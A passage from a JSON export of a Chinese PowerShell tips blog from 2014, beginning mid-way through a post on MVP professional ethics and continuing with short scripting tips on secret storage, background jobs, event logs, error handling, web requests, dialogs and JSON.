非常乐于经营技术社群，或是blog，并且分享技术心得，应用与概念等。 具有高度的技术热情，不是三分钟热度型的，这会反应在很多方面。 具有亲和力，不论是在社群中或是课堂中，不过这不代表MVP 会特别容忍小白行为。 乐于推广微软技术，并且运用微软技术发展出许多有趣的应用。 彼此会相互支援，除了问题解答外，也包括工作机会或是合作机会等，这些机会都是植基于 相互的信任 。 只是，在这六年之中，我也看过一些MVP 的害群之马，让MVP 的名声受到质疑或是备受批评等，不过这些人其实很少很少，但在社会总关注负面消息的氛围之下，负面的资讯总是容易被关注，所以通常99% 的MVP 贡献，都会被1% 的负面消息所掩盖… 另外，由于MVP的甄选条件使然， 有部份申请人会为了想在申请书上好看一点，便在社群中或是部落格中使用一些奇怪的旁门左道，来炒高自己的评价或是人气指数 ，或者是其他可以被微软认可的条件，然而，这 基本上已违反了MVP间不成文的职业道德规范 ，它也许会让你当选MVP，但本质上这是一种不正当手段，且很容易被MVP团体中的其他成员识破，反而会让自己陷入道德疑虑的泥淖中，想要获得其他MVP在相互支援上的协助的话，会变得非常困难，其中一个原因，便是对你的道德有所质疑。 而且，申请人应该要有一个观念，在微软公布你录取的名单的时候，MVP的责任就已经产生了，申请人在社群，课堂，著作，技术分享与解决问题的各项表现，都会被外界当成评价你，以及MVP团体水准的明确指标，所谓一粒老鼠屎坏了一锅粥，身为MVP团体中的成员之一，应该要有致力维持MVP团体名声以及评价的责任，而不是只想捞到好处，拍拍屁股就走人，甚至于把MVP的评价搞坏后被大家踢出这个团体，业界是很小的，基本的职业水准和职业道德是不可轻忽的。 外部来源（正体中文）","link":"/2014/04/03/mvp/"},{"title":"PowerShell 技能连载 - 使用加密文件系统（EFS）来保护密码","text":"如果您必须在脚本中以硬编码的方式包含密码和其它隐私信息（正常情况下应避免使用），那么您还可以通过 EFS（加密文件系统）的方式来保障安全性。加密的脚本只能被加密者读取（和执行），所以只有您在自己的机器上能运行该脚本。 一下是加密一个 PowerShell 脚本的简单方法： # create some sample script # replace path with some real-world existing script if you want # and remove the line that creates the script $path = &quot;$env:temp\\test.ps1&quot; &quot;Write-Host 'I run only for my master.'&quot; &gt; $path $file = Get-Item -Path $path $file.Encrypt() 当您运行这段脚本时，它将在您的临时文件夹中创建一个用 EFS 加密的新的 PowerShell 脚本（如果您见到一条错误提示信息，那么很有可能您机器上的 EFS 不可用或者被禁用了）。 加密之后，该文件在 Windows 资源管理器中呈现绿色，并且只有您能够运行它。别人无法看见源代码。 请注意在许多企业环境中，EFS 系统是通过恢复密钥部署的。指定的维护人员可以通过主密钥解密文件。如果没有主密钥，一旦您丢失了您的 EFS 证书，就连您也无法查看或运行加密的脚本。","link":"/2014/04/03/using-encrypting-file-system-efs-to-protect-passwords/"},{"title":"PowerShell 技能连载 - 存储秘密数据","text":"如果您想以只有您能获取的方式保存敏感数据，您可以使用这个有趣的方法：将明文转换成密文，需要时将密文转换回明文，并将它保存到磁盘中： $storage = &quot;$env:temp\\secretdata.txt&quot; $mysecret = 'Hello, I am safe.' $mysecret | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString | Out-File -FilePath $storage 当您打开该文件的时候，它读起来像这个样子： 您的秘密被 Windows 自带的数据保护 API(DPAPI) 用您的身份和机器作为密钥加密。所以只有您（或任何以您的身份运行的进程）可以将该密文解密，而且只能在加密时所用的计算机上解密。 要得到明文，请使用这段代码： $storage = &quot;$env:temp\\secretdata.txt&quot; $secureString = Get-Content -Path $storage | ConvertTo-SecureString $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToGlobalAllocUnicode($secureString) $mysecret = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($ptr) $mysecret 它可以正常使用——您可以获得和加密前一模一样的文本。 现在，以其他人的身份试一下。您会发现其他人无法解密该加密文件。而且您在别的机器上也无法解密。","link":"/2014/04/04/storing-secret-data/"},{"title":"PowerShell 技能连载 - 读取整个文本文件","text":"您可以用 Get-Content 来读入整个文本文件。但是，Get-Content 是逐行返回文件的内容，您得到的是一个 string 数组，并且换行符被去掉了。 要一次性读取整个文本文件，从 PowerShell 3.0 开始，您可以使用 -Raw 参数（它还有个好处，能够大大加快读取文件的速度）。 所以通过以下代码您可以获得一个字符串数组，每个元素是一行文本： Length 属性表示文件的行数。 以下代码一次性读取整个文本文件，返回单个字符串： 这回，Length 属性表示整个文件的字符数，并且读取文件的速度大大提高（虽然也更占内存了）。 那种方法更好？这取决于您要如何使用这些数据。","link":"/2014/04/07/reading-all-text/"},{"title":"PowerShell 技能连载 - 修正 Excel CSV 的编码","text":"当您将 Microsoft Excel 的数据保存为 CSV 格式时，很不幸的是保存的编码和 Import-Csv 的缺省编码并不匹配。所以当您将 CSV 文件导入 PowerShell 时，无论您指定哪种编码，特殊字符都会变成乱码。 以下是一个我从 Excel 导出的 list.csv 文件，它包含一些特殊字符。如果您使用缺省编码，特殊字符会变成乱码，并且如果您指定了 -Encoding 参数，无论您传什么值，特殊字符都不会显示回原来正常的状态： 当您模拟在这些场景中 Import-Csv 的行为时，它很意外地可以完美处理： 这说明要正确地读取 Excel CSV 文件，您必须显式地指定“缺省”编码（这引出了一个问题：当您未指定编码的时候，缺省使用的是什么编码）：","link":"/2014/04/08/fixing-encoding-for-excel-csv/"},{"title":"PowerShell 技能连载 - 记录脚本的运行时间","text":"如果您想记录脚本的运行时间，您可以使用 Measure-Command，但是这个 cmdlet 仅适合诊断目的，并且没有计算输出时间。 另一种方法是创建两个快照，并且在结束时计算时间差。 这段代码将告诉您 Get-Hotfix cmdlet 的执行时间，包括输出数据的时间： $start = Get-Date Get-HotFix $end = Get-Date Write-Host -ForegroundColor Red ('Total Runtime: ' + ($end - $start).TotalSeconds)","link":"/2014/04/09/logging-script-runtime/"},{"title":"PowerShell 技能连载 - 将 Tick 转换为真实的日期","text":"Active Directory 内部使用 tick （从 1601 年起的百纳秒数）来表示日期和时间。在以前，要将这个大数字转换为人类可读的日期和时间是很困难的。以下是一个很简单的办法： [DateTime]::FromFileTime(635312826377934727) 类似地，要将一个日期转换为 tick 数，使用以下方法：","link":"/2014/04/10/converting-ticks-into-real-date/"},{"title":"PowerShell 技能连载 - PowerShell 中的并行处理","text":"如果想提升一个脚本的执行速度，您也许会发现后台任务十分有用。它们适用于做大量并发处理的脚本。 PowerShell 是单线程的，一个时间只能处理一件事。使用后台任务时，后台会创建额外的 PowerShell 进程并且共享负荷。这只在任务彼此独立，并且后台任务不产生很多数据的情况下能很好地工作。从后台任务中发回数据是一个开销很大的过程，并且很有可能把节省出来的时间给消耗了，导致脚本执行起来反而更慢。 以下是三个可以并发执行的任务： $start = Get-Date # get all hotfixes $task1 = { Get-Hotfix } # get all scripts in your profile $task2 = { Get-Service | Where-Object Status -eq Running } # parse log file $task3 = { Get-Content -Path $env:windir\\windowsupdate.log | Where-Object { $_ -like '*successfully installed*' } } # run 2 tasks in the background, and 1 in the foreground task $job1 = Start-Job -ScriptBlock $task1 $job2 = Start-Job -ScriptBlock $task2 $result3 = Invoke-Command -ScriptBlock $task3 # wait for the remaining tasks to complete (if not done yet) $null = Wait-Job -Job $job1, $job2 # now they are done, get the results $result1 = Receive-Job -Job $job1 $result2 = Receive-Job -Job $job2 # discard the jobs Remove-Job -Job $job1, $job2 $end = Get-Date Write-Host -ForegroundColor Red ($end - $start).TotalSeconds 在一个测试环境中，执行所有三个任务消耗 5.9 秒。三个任务的结果分别保存到 $result1，$result2，$result3。 我们测试一下三个任务在前台顺序执行所消耗的时间： $start = Get-Date # get all hotfixes $task1 = { Get-Hotfix } # get all scripts in your profile $task2 = { Get-Service | Where-Object Status -eq Running } # parse log file $task3 = { Get-Content -Path $env:windir\\windowsupdate.log | Where-Object { $_ -like '*successfully installed*' } } # run them all in the foreground: $result1 = Invoke-Command -ScriptBlock $task1 $result2 = Invoke-Command -ScriptBlock $task2 $result3 = Invoke-Command -ScriptBlock $task3 $end = Get-Date Write-Host -ForegroundColor Red ($end - $start).TotalSeconds 这段代码仅仅执行了 5.05 秒。所以后台任务只对于长期运行并且各自占用差不多时间的任务比较有效。由于这三个测试任务返回了大量的数据，所以并发执行带来的好处差不多被将执行结果序列化并传回前台进程的过程给抵消掉了。","link":"/2014/04/11/parallel-processing-in-powershell/"},{"title":"PowerShell 技能连载 - 高效运行后台任务","text":"如前一个技巧所述，用后台任务来同步运行任务往往效率不高。当后台任务返回的数据量增加时，它的执行性能变得更差。 一个更高效的办法是用进程内任务。它们在同一个 PowerShell 实例内部的不同线程中独立运行，所以不需要将返回值序列化。 以下是一个用 PowerShell 线程功能，运行两个后台线程和一个前台线程的例子。为了使任务真正长时间运行，我们为每个任务在业务代码之外使用了 Start-Sleep 命令： $start = Get-Date $task1 = { Start-Sleep -Seconds 4; Get-Service } $task2 = { Start-Sleep -Seconds 5; Get-Service } $task3 = { Start-Sleep -Seconds 3; Get-Service } # run 2 in separate threads, 1 in the foreground $thread1 = [PowerShell]::Create() $job1 = $thread1.AddScript($task1).BeginInvoke() $thread2 = [PowerShell]::Create() $job2 = $thread2.AddScript($task2).BeginInvoke() $result3 = Invoke-Command -ScriptBlock $task3 do { Start-Sleep -Milliseconds 100 } until ($job1.IsCompleted -and $job2.IsCompleted) $result1 = $thread1.EndInvoke($job1) $result2 = $thread2.EndInvoke($job2) $thread1.Runspace.Close() $thread1.Dispose() $thread2.Runspace.Close() $thread2.Dispose() $end = Get-Date Write-Host -ForegroundColor Red ($end - $start).TotalSeconds 如果依次执行这三个任务，分别执行 Start-Sleep 语句将至少消耗 12 秒。事实上该脚本只消耗 5 秒多一点。处理结果分别为 $result1，$result2 和 $result3。相对后台任务而言，返回大量数据基本不会造成时间消耗。","link":"/2014/04/14/running-background-jobs-efficiently/"},{"title":"PowerShell 技能连载 - 从所有事件日志中获取全部事件","text":"最近，一个读者咨询如何从所有事件日志中获取全部事件，并且能将它们保存到文件中。 以下是一个可能的解决方案： # calculate start time (one hour before now) $Start = (Get-Date) - (New-Timespan -Hours 1) $Computername = $env:COMPUTERNAME # Getting all event logs Get-EventLog -AsString -ComputerName $Computername | ForEach-Object { # write status info Write-Progress -Activity &quot;Checking Eventlogs on \\\\$ComputerName&quot; -Status $_ # get event entries and add the name of the log this came from Get-EventLog -LogName $_ -EntryType Error, Warning -After $Start -ComputerName $ComputerName -ErrorAction SilentlyContinue | Add-Member NoteProperty EventLog $_ -PassThru } | # sort descending Sort-Object -Property TimeGenerated -Descending | # select the properties for the report Select-Object EventLog, TimeGenerated, EntryType, Source, Message | # output into grid view window Out-GridView -Title &quot;All Errors &amp; Warnings from \\\\$Computername&quot; 在这个脚本的顶部，您可以设置希望查询的远程主机，以及希望获取的最近小时数。 接下来，这个脚本获取该机器上所有可用的日志文件，然后用一个循环来获取指定时间区间中的错误和警告记录。要想知道哪个事件是来自哪个日志文件，脚本还用 Add-Member 为日志记录添加了一个新的“EventLog”属性。 脚本的执行结果是在一个网格视图的窗口中显示一小时之内的所有错误和警告事件。如果将 Out-GridView 改为 Out-File 或 Export-Csv 将可以把信息保存到磁盘。 请注意远程操作需要 Administrator 特权。远程操作可能需要额外的安全设置。另外，请注意如果以非 Administrator 身份运行该代码，将会收到红色的错误提示信息（因为某些日志，比如说“安全”需要特殊的操作权限）。","link":"/2014/04/15/getting-events-from-all-event-logs/"},{"title":"PowerShell 技能连载 - 屏蔽终止性错误","text":"有时候，您会注意到虽然已经为 -ErrorAction 参数指定了 &quot;SilentlyContinue&quot; 值，cmdlet 还是会抛出错误。 -ErrorAction 参数只能隐藏非终止性错误（原本被 cmdlet 处理的错误）。不被 cmdlet 处理的错误称为“终止性错误”。这些错误通常是和安全相关的，并且不能被 -ErrorAction 屏蔽。 所以如果您是一个非管理员用户，虽然用 -ErrorAction 指定了屏蔽错误，以下调用将会抛出一个异常： 要屏蔽终止性错误，您必须使用异常处理器： try { Get-EventLog -LogName Security } catch {}","link":"/2014/04/16/hiding-terminating-errors/"},{"title":"PowerShell 技能连载 - 捕获非终止性错误","text":"非终止性错误是在 cmdlet 内部处理的错误。多数在 cmdlet 中产生的错误都是非终止性错误。 您无法用异常处理器来捕获这些错误。所以虽然在这个例子中有一个异常处理器，它也无法捕获 cmdlet 错误： try { Get-WmiObject -Class Win32_BIOS -ComputerName offlineIamafraid } catch { Write-Warning &quot;Oops, error: $_&quot; } 要捕获非终止性错误，您必须将它们转换为终止性错误。可以通过设置 -ErrorAction 参数为 &quot;Stop&quot; 来实现： try { Get-WmiObject -Class Win32_BIOS -ComputerName offlineIamafraid -ErrorAction Stop } catch { Write-Warning &quot;Oops, error: $_&quot; } 如果您不想一个一个为异常处理器中所有的 cmdlet 添加 -ErrorAction Stop 参数，您可以临时将 $ErrorActionPreference 变量设置为 &quot;Stop&quot;。该设置用于一个 cmdlet 没有显示地设置 -ErrorAction 的情况。","link":"/2014/04/17/catching-non-terminating-errors/"},{"title":"PowerShell 技能连载 - 记录所有错误","text":"在上一个技巧中您学到了只有将 cmdlet 的 -ErrorAction 参数设为 &quot;Stop&quot;，才可以用异常处理器捕获 cmdlet 的错误。但使用这种方式改变了 cmdlet 的行为。它将导致 cmdlet 发生第一个错误的时候停止执行。 请看下一个例子：它将在 windows 文件夹中递归地扫描 PowerShell 脚本。如果您希望捕获错误（例如存取受保护的子文件夹），这将无法工作： try { Get-ChildItem -Path $env:windir -Filter *.ps1 -Recurse -ErrorAction Stop } catch { Write-Warning &quot;Error: $_&quot; } 以上代码将捕获第一个错误，但 cmdlet 将会停止执行，并且不会继续扫描剩下的子文件夹。 如果您只是需要隐藏错误提示信息，但需要完整的执行结果，而且异常处理器不会捕获到任何东西： try { Get-ChildItem -Path $env:windir -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue } catch { Write-Warning &quot;Error: $_&quot; } 所以如果您希望一个 cmdlet 运行时不会中断，并且任然能获取一个您有权限的文件夹的完整列表，那么请不要使用异常处理器。相反，使用 -ErrorVariable 并将错误信息静默地保存到一个变量中。 当该 cmdlet 执行结束时，您可以获取该变量的值并产生一个错误报告： Get-ChildItem -Path $env:windir -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable myErrors Foreach ($incidence in $myErrors) { Write-Warning (&quot;Unable to access &quot; + $incidence.CategoryInfo.TargetName) }","link":"/2014/04/18/logging-all-errors/"},{"title":"PowerShell 技能连载 - 将日志写入自定义的事件日志","text":"我们常常需要在脚本运行时记录一些信息。如果将日志信息写入文本文件，那么您需要自己维护和管理它们。您还可以使用 Windows 自带的日志系统，并享受它带来的各种便利性。 要达到这个目的，您只需要初始化一个您自己的日志。这只需要由管理员操作一次。操作方法是以管理员身份启动 PowerShell，然后输入一行代码： 这样就好了。您现在有了一个可以记录“LogonScript”、“MaintenanceScript”和“Miscellaneous”事件源的日志文件。接下来，您可能只需再进行一些配置，告诉日志系统日志文件的最大容量，以及容量达到最大值的时候需要做什么操作即可： 现在，您新的日志文件最大可增长到 500MB，并且记录在被新记录覆盖之前可以保持 30 天。 您现在可以关闭您的特权窗口。写日志文件并不需要特殊的权限，并且可以从任何普通的脚本或登录脚本中写入日志。所以打开一个普通的 PowerShell 控制台，然后输入以下代码： 现在记录事件十分简单了，您可以根据需要选择任意的事件编号或消息。唯一的前提是只能写入已注册的事件源。 使用 Get-EventLog，您可以很方便地分析机器中的脚本问题： 所以，既然您可以方便地使用工业级强度的 Windows 日志系统，何须费劲地将信息记在纯文本文件中呢？","link":"/2014/04/21/writing-events-to-own-event-logs/"},{"title":"PowerShell 技能连载 - 智能感知显示变量的技巧","text":"在 PowerShell ISE 编辑器中，当您键入一个美元符号，将弹出一个智能感知菜单列出当前定义的所有变量。此时当您键入更多字符时，您不仅看见以这些字符开头的变量，而且还能看见在名字任意位置包含这些字符的变量。 要想只看到以您键入的字符开头的变量，请按下 ESC 键关闭智能感知菜单，然后按下 CTRL+SPACE 重新打开它。现在，它将只显示以您键入的字符开头的变量。","link":"/2014/04/22/intellisense-trick-to-show-variables/"},{"title":"PowerShell 技能连载 - 查找注册的事件源","text":"每个 Windows 日志文件都有一个注册的事件源列表。要找出哪个事件源注册到哪个事件日志，您可以直接查询 Windows 注册表。 这段代码将列出所有注册到“System”事件日志的事件源： $LogName = 'System' $path = &quot;HKLM:\\System\\CurrentControlSet\\services\\eventlog\\$LogName&quot; Get-ChildItem -Path $path -Name","link":"/2014/04/23/finding-registered-event-sources/"},{"title":"PowerShell 技能连载 - 从 Google 图片搜索中获取图片 URL","text":"当您想从互联网下载信息时，Invoke-WebRequest 是您的好帮手。例如，您可以发送一个请求到 Google 并使用 PowerShell 检验它的结果。 Google 也知道您在这么做，所以当您从 PowerShell 发送一个查询时，Google 返回加密的链接。要获取真实的链接，您需要告诉 Google 您使用的不是 PowerShell 而是一个普通的浏览器。这可以通过设置浏览器代理字符串。 这段脚本输入一个关键字并返回所有符合搜索关键字，并且大于 2 兆像素的所有图片的原始地址： $SearchItem = 'PowerShell' $url = &quot;https://www.google.com/search?q=$SearchItem&amp;espv=210&amp;es_sm=93&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;tbm=isch&amp;tbs=isz:lt%2Cislt:2mp&quot; $browserAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36' $page = Invoke-WebRequest -Uri $url -UserAgent $browserAgent $page.Links | Where-Object { $_.href -like '*imgres*' } | ForEach-Object { ($_.href -split 'imgurl=')[-1].Split('&amp;')[0]}","link":"/2014/04/24/getting-picture-urls-from-google-picture-search/"},{"title":"PowerShell 技能连载 - 通过 Google 图片搜索自动下载图片","text":"在前一个技巧中您学到了如何用 Invoke-WebRequest 从 Google 图片搜索中获取图片链接。Invoke-WebRequest 还可以做更多的东西。它可以获取图片 URL 并下载图片。 以下是具体做法： $SearchItem = 'PowerShell' $TargetFolder = 'c:\\webpictures' if ( (Test-Path -Path $TargetFolder) -eq $false) { md $TargetFolder } explorer.exe $TargetFolder $url = &quot;https://www.google.com/search?q=$SearchItem&amp;espv=210&amp;es_sm=93&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;tbm=isch&amp;tbs=isz:lt%2Cislt:2mp&quot; $browserAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36' $page = Invoke-WebRequest -Uri $url -UserAgent $browserAgent $page.Links | Where-Object { $_.href -like '*imgres*' } | ForEach-Object { ($_.href -split 'imgurl=')[-1].Split('&amp;')[0]} | ForEach-Object { $file = Split-Path -Path $_ -Leaf $path = Join-Path -Path $TargetFolder -ChildPath $file Invoke-WebRequest -Uri $_ -OutFile $path } 您可以下载所有匹配关键字“PowerShell”的高分辨率的图片到您指定的 $TargetFolder 文件夹中。","link":"/2014/04/25/automatically-downloading-pictures-via-google-picture-search/"},{"title":"PowerShell 技能连载 - 弹出对话框时播放随机的音效","text":"您也许了解了如何用脚本打开一个 MsgBox 对话框。今天，您将学习如何用一段代码打开一个 MsgBox，同时播放一段随机的音效，吸引用户的注意力并增加趣味性。当用户操作 MsgBox 的时候，音效立即停止： # find random WAV file in your Windows folder $randomWAV = Get-ChildItem -Path C:\\Windows\\Media -Filter *.wav | Get-Random | Select-Object -ExpandProperty Fullname # load Forms assembly to get a MsgBox dialog Add-Type -AssemblyName System.Windows.Forms # play random sound until MsgBox is closed $player = New-Object Media.SoundPlayer $randomWAV $player.Load(); $player.PlayLooping() $result = [System.Windows.Forms.MessageBox]::Show(&quot;We will reboot your machine now. Ok?&quot;, &quot;PowerShell&quot;, &quot;YesNo&quot;, &quot;Exclamation&quot;) $player.Stop()","link":"/2014/04/28/open-msgbox-with-random-sound/"},{"title":"PowerShell 技能连载 - 从命令行中提取可执行程序名","text":"有些时候我们需要从命令行提取命令名。以下是实现的方法： 代码如下： function Remove-Argument { param ( $CommandLine ) $divider = ' ' if ($CommandLine.StartsWith('&quot;')) { $divider = '&quot;' $CommandLine = $CommandLine.SubString(1) } $CommandLine.Split($divider)[0] }","link":"/2014/04/29/getting-executable-from-command-line/"},{"title":"PowerShell 技能连载 - 从命令行获取参数","text":"在前一个技巧中，我们演示了如何从命令行中提取命令名，并忽略所有参数。今天，您将学习到如何用一个函数同时获取到命令名和参数。该函数将命令行分割为实际的命令名和它的参数，并返回一个自定义对象： function Get-Argument { param ( $CommandLine ) $result = 1 | Select-Object -Property Command, Argument if ($CommandLine.StartsWith('&quot;')) { $index = $CommandLine.IndexOf('&quot;', 1) if ($index -gt 0) { $result.Command = $CommandLine.SubString(0, $index).Trim('&quot;') $result.Argument = $CommandLine.SubString($index+1).Trim() $result } } else { $index = $CommandLine.IndexOf(' ') if ($index -gt 0) { $result.Command = $CommandLine.SubString(0, $index) $result.Argument = $CommandLine.SubString($index+1).Trim() $result } } } Get-Argument -CommandLine 'notepad c:\\test' Get-Argument -CommandLine '&quot;notepad.exe&quot; c:\\test' 结果如下： 这是一个实际应用中的例子：它获取所有运行中的进程，并返回每个进程的命令名和参数： Get-WmiObject -Class Win32_Process | Where-Object { $_.CommandLine } | ForEach-Object { Get-Argument -CommandLine $_.CommandLine } 以下是结果的样子： 既然命令和参数都分开了，您还可以像这样为信息分组： Get-WmiObject -Class Win32_Process | Where-Object { $_.CommandLine } | ForEach-Object { Get-Argument -CommandLine $_.CommandLine } | Group-Object -Property Command | Sort-Object -Property Count -Descending | Out-GridView","link":"/2014/04/30/getting-arguments-from-command-line/"},{"title":"PowerShell 技能连载 - 查找缺省的 MAPI 客户端","text":"您机器上的 MAPI 客户端就是处理类似“mailto:” URL 的缺省电子邮件客户端。我们设计一个函数来查找是否有 MAPI 客户端，如果有的话，查看具体是哪一个。该函数从 Windows 注册表中获取这项信息： function Get-MAPIClient { function Remove-Argument { param ( $CommandLine ) $divider = ' ' if ($CommandLine.StartsWith('&quot;')) { $divider = '&quot;' $CommandLine = $CommandLine.SubString(1) } $CommandLine.Split($divider)[0] } $path = 'Registry::HKEY_CLASSES_ROOT\\mailto\\shell\\open\\command' # create new object to return values $returnValue = 1 | Select-Object -Property HasMapiClient, Path, MailTo $returnValue.hasMAPIClient = Test-Path -Path $path if ($returnValue.hasMAPIClient) { $values = Get-ItemProperty -Path $path $returnValue.MailTo = $values.'(default)' $returnValue.Path = Remove-Argument $returnValue.MailTo if ((Test-Path -Path $returnValue.Path) -eq $false) { $returnValue.hasMAPIClient = $true } } $returnValue } Get-MAPIClient 以下是使用结果：","link":"/2014/05/01/finding-default-mapi-client/"},{"title":"PowerShell 技能连载 - 通过 Outlook 发送电子邮件","text":"您显然可以通过 Send-MailMessage 直接发送邮件。但如果您希望通过缺省的 MAPI 客户端发送电子邮件，也不会太麻烦： $subject = 'Sending via MAPI client' $body = 'My Message' $to = 'tobias@powertheshell.com' $mail = &quot;mailto:$to&amp;subject=$subject&amp;body=$body&quot; Start-Process -FilePath $mail 这个脚本利用了 mailto: 语法。如果您已安装了一个 MAPI 客户端，这将打开一个电子邮件表单并且将脚本指定的内容填充进去。不过您需要手工发送邮件。","link":"/2014/05/02/sending-email-via-outlook/"},{"title":"PowerShell 技能连载 - 显示 WPF 消息提示","text":"WPF (Windows Presentation Foundation) 是一种创建窗体和对话框的技术。WPF 的好处是窗体设计和程序代码可以分离。 以下是一个显示醒目消息的例子。消息内容定义在 XAML 代码中，看起来类似 HTML （不过是区分大小写的）。您可以很容易地调整字体大小、文字、颜色等。不需要改任何程序代码： $xaml = @&quot; &lt;Window xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation'&gt; &lt;Border BorderThickness=&quot;20&quot; BorderBrush=&quot;Yellow&quot; CornerRadius=&quot;9&quot; Background='Red'&gt; &lt;StackPanel&gt; &lt;Label FontSize=&quot;50&quot; FontFamily='Stencil' Background='Red' Foreground='White' BorderThickness='0'&gt; System will be rebooted in 15 minutes! &lt;/Label&gt; &lt;Label HorizontalAlignment=&quot;Center&quot; FontSize=&quot;15&quot; FontFamily='Consolas' Background='Red' Foreground='White' BorderThickness='0'&gt; Worried about losing data? Talk to your friendly help desk representative and freely share your concerns! &lt;/Label&gt; &lt;/StackPanel&gt; &lt;/Border&gt; &lt;/Window&gt; &quot;@ $reader = [System.XML.XMLReader]::Create([System.IO.StringReader] $xaml) $window = [System.Windows.Markup.XAMLReader]::Load($reader) $Window.AllowsTransparency = $True $window.SizeToContent = 'WidthAndHeight' $window.ResizeMode = 'NoResize' $Window.Opacity = .7 $window.Topmost = $true $window.WindowStartupLocation = 'CenterScreen' $window.WindowStyle = 'None' # show message for 5 seconds: $null = $window.Show() Start-Sleep -Seconds 5 $window.Close()","link":"/2014/05/05/showing-wpf-info-message/"},{"title":"PowerShell 技能连载 - 键盘鼠标自动化","text":"某些时候，唯一的自动化处理办法是向 UI 组件发送按键和鼠标点击消息。一个强大且免费的 PowerShell 扩展，叫做“WASP”，地址如下： http://wasp.codeplex.com/ 一旦您装好了这个模块（解压前别忘了解除 ZIP 文件锁定。方法是右键点击，属性，解锁），WASP 模块提供以下 cmdlet： 以下是一个简单的操作 Windows 计算器的例子： Import-Module WASP # launch Calculator $process = Start-Process -FilePath calc -PassThru $id = $process.Id Start-Sleep -Seconds 2 $window = Select-Window | Where-Object { $_.ProcessID -eq $id } # send keys $window | Send-Keys 123 $window | Send-Keys '{+}' $window | Send-Keys 999 $window | Send-Keys = # send CTRL+c $window | Send-Keys '^c' # Result is now available from clipboard 以下是附加说明： 启动一个进程之后，要等待 1-2 秒，待窗体创建号以后才可以用 WASP 找到该窗口。 参考 SendKeys API 发送按键。有些字符需要通过两边加花括号的方式转义。更多细节请参见这里：http://msdn.microsoft.com/en-us/library/system.windows.forms.sendkeys.send(v=vs.110).aspx/ 当需要发送按键序列，例如 CTRL+C 时，请使用小写字母。“^c”代表发送 CTRL+c，而“^C”代表发送 CTRL+SHIFT+C。 只有 WinForm 窗口支持操作子控件，例如特定的文本框和按钮（Select-ChildWindow, Select-Control）。WPF 窗口也可以接收按键，但是 WPF 中在窗体的 UI 组件之上无法获得支持输入的控件。","link":"/2014/05/06/automation-via-keystroke-and-mouse-click/"},{"title":"PowerShell 技能连载 - 更新 Windows Defender 病毒定义","text":"Windows 8.1 带来了一系列新的 cmdlet。其中一个可以自动下载并安装 Windows Defender 最新的反病毒定义。 Get-MpComputerStatus 返回当前病毒定义的信息。 这些 cmdlet 不是 PowerShell 的一部分，而是 Windows 8.1 的一部分，所以在早期版本的操作系统中，您会碰到找不到命令的错误信息。","link":"/2014/05/07/updating-windows-defender-signatures/"},{"title":"PowerShell 技能连载 - 获取父作用域中的变量值","text":"如果您在一个函数中定义了变量，那么这些变量只在函数作用域内有效。要查看在外层作用域的变量值，请使用带 -Scope 参数的 Get-Variable 命令： $a = 1 function test { $a = 2 $parentVariable = Get-Variable -Name a -Scope 1 $parentVariable.Value } test 当脚本调用“test”函数时，函数定义了一个 $a 并且将它的值设为 2。在调用者作用域中，变量 $a 的值是 1。通过 Get-Variable，函数内可以得到外层作用域中的变量值。","link":"/2014/05/08/getting-variable-value-in-parent-scope/"},{"title":"PowerShell 技能连载 - 用 JSON 来创建对象","text":"JSON 用来描述对象的，类似 XML，但是 JSON 更简单得多.JSON 支持嵌套的对象属性，所以您可以从各种数据源中获取信息，然后将它们合并成一个自定义对象。 让我们来看看效果。以下代码创建一个清单条目，包含了电脑的许多详细信息： $json = @&quot; { &quot;ServerName&quot;: &quot;$env:ComputerName&quot;, &quot;UserName&quot;: &quot;$env:UserName&quot;, &quot;BIOS&quot;: { &quot;Manufacturer&quot; : &quot;$((Get-WmiObject -Class Win32_BIOS).Manufacturer)&quot;, &quot;Version&quot; : &quot;$((Get-WmiObject -Class Win32_BIOS).Version)&quot;, &quot;Serial&quot; : &quot;$((Get-WmiObject -Class Win32_BIOS).SerialNumber)&quot; }, &quot;OS&quot; : &quot;$([Environment]::OSVersion.VersionString)&quot; } &quot;@ $info = ConvertFrom-Json -InputObject $json $info.ServerName $info.BIOS.Version $info.OS 您接下来可以操作结果对象——获取信息，或增加、更新详细信息。 如果您对对象做了改动，可以用 ConvertTo-Json 将它序列化为 JSON 对象格式：","link":"/2014/05/09/use-json-to-create-objects/"},{"title":"PowerShell 技能连载 - PowerShell 不支持 JSON 数据类型","text":"缺省情况下，从 JSON 创建的对象使用 String 作为数据的类型： $json = @&quot; { &quot;Name&quot;: &quot;Weltner&quot;, &quot;ID&quot; : &quot;123&quot; } &quot;@ $info = ConvertFrom-Json -InputObject $json $info.Name $info.ID 但是，JSON 不支持数据类型，虽然 JSON 数据类型并不等价于 .NET 数据类型。请注意在以下代码中，“ID”被定义成“数字”型，并且它被赋予一个数值型的值，而不需要用双引号引起来。 $json = @&quot; { &quot;Name&quot;: &quot;Weltner&quot;, number: &quot;ID&quot; : 123 } &quot;@ $info = ConvertFrom-Json -InputObject $json $info.Name $info.ID 然而，当使用 ConvertFrom-Json 时，我们发现 PowerShell 并没有关心数据类型定义。它总是将值转换为 String 数据。","link":"/2014/05/12/powershell-does-not-support-json-data-types/"},{"title":"PowerShell 技能连载 - 创建 Excel 报表","text":"PowerShell 对象可以很容易地通过 Microsoft Excel 打开。只需要将对象导出成 CSV，然后通过关联的应用程序打开 CSV 文件（如果装了 Excel，那么将用 Excel 打开）。 以下代码创建一个当前运行的进程报告，并用 Excel 打开： $Path = &quot;$env:temp\\$(Get-Random).csv&quot; $originalProperties = 'Name', 'Id', 'Company', 'Description', 'WindowTitle' Get-Process | Select-Object -Property $originalProperties | Export-Csv -Path $Path -Encoding UTF8 -NoTypeInformation -UseCulture Invoke-Item -Path $Path 请注意 -UseCulture 如何根据您的区域设置自动选择正确的分隔符。","link":"/2014/05/13/creating-excel-reports/"},{"title":"PowerShell 技能连载 - 修正 Excel 